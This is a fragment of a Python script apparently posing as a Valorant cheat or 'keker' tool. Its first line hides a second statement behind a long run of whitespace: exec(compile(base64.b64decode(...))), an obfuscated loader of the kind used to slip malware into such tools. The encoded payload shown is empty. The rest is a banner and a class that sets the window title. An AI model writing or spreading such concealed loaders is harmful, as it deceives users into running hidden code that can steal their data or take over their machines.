...
type("__init__")                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
ascii_text = """                 _                       _            
...
class valorant:
    ...
    def main(self):
        os.system("cls")
        self.change_title("Valorant Keker | Github: https://github.com/despk")
